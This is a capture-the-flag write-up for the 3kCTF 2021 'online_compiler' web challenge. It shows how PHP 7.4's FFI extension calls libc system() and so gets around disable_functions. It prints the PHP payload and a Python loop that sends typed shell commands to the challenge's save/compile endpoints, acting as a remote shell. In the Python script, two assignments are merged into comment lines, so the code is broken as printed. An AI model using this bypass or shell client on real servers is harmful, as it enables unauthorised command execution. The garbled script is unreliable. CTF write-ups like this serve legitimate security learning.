## (Web) online_compiler [425 pts]

The online_compiler challenge is bypass the disable_functions and get the flag.

First at challenge, Given the back-end code and php.ini file. When execute the php code at back-end you just need to checked the execute based on php.ini file. If u check the php.ini file, you will see many functions are disabled based on disable_functions. Deservedly, Was disabled function that shell command can be execute.

![](https://raw.githubusercontent.com/P0cas/image/main/3kctf%202021/1.png)
But, Because `phpinfo()` is not disabled, I can check the PHP Version as above and can know using the `7.4.X` version in server. So, I did a search for vulnerabilities that occur in that version.

![](https://raw.githubusercontent.com/P0cas/image/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-16%20%E1%84%8B%E1%85%A9%E1%84%92%E1%85%AE%207.00.45.png)
![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.43.32.png?raw=true)
I found content as above while gooling. I did a gooling keyword is `php 7.4 disable_functions bypass`. As above content is one among several bypass list. So, I checked `FFI` in `phpinfo()` and it was enabled.

![](https://github.com/wjddnjs33/image/blob/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.31.49.png?raw=true)
I did say without thinking `"This seem the most possible"` to jingyu bro on may 7 pm 7 hour. Fucking, After that, I did googling for another 2 hour.

![](https://raw.githubusercontent.com/P0cas/image/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.30.48.png)
First, I first looked at FFI and it stands for Foreign function interface, which is an external function interface, but I didn’t know how to use it. Then I found a strange article, and I could see the cdef() method used in the FFI class. It can be seen that an object is created by inserting a C language function prototype as the argument value of cdef(), and an external function is executed by referring to the function prototype created from the object.

![](https://raw.githubusercontent.com/P0cas/image/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.39.19.png)
The prototype of the C Language system() function was as above. It seems like it was because I didn’t do it as a pointer variable when I just did `const char command’.

```php
<?php 
  $ffi=FFI::cdef("int system(const char *command);");
  $ffi->system('ls');
?>
```
So, as a result, the payload was written as above. At first, like the picture above, the library file was also passed as a parameter, but it didn’t work well when passed. Probably because there is no file in the same path, it seems like that, but even without it, there was no problem.

![](https://raw.githubusercontent.com/P0cas/image/main/3kctf%202021/%E1%84%89%E1%85%B3%E1%84%8F%E1%85%B3%E1%84%85%E1%85%B5%E1%86%AB%E1%84%89%E1%85%A3%E1%86%BA%202021-05-17%20%E1%84%8B%E1%85%A9%E1%84%8C%E1%85%A5%E1%86%AB%202.50.22.png)
When I wrote the code in Python and checked it, the El_FlAAG___FilEE file existed in the upper directory. So when I read the file, a flag came out. In the end, it was correct that I did say to jingyu bro on 7 pm earlier. zz

```python
import requests
from pwn import *

url = 'http://onlinecompiler.2021.3k.ctf.to:5000/'
path = ['save', 'compile']

while(1):
    command = raw_input("pocas@py : ")
    c_type, code = 'php', '<?php $ffi=FFI::cdef("int system(const char *command);");$ffi->system(\'{}\');?>'.format(command)
    body1 = {'c_type':c_type, 'code':code}

    # save     filename = requests.post(url + path[0], data=body1).text
    log.info("Exploitation")
    log.info("filename : " + filename)

    # compile     body2 = {'c_type':c_type, 'filename':filename}
    result = requests.post(url + path[1], data=body2).text.replace('\n', ' ')
    log.info("result : " + result)
```
```txt
3k{JuSt_A_WaRmUp_O.o}
```

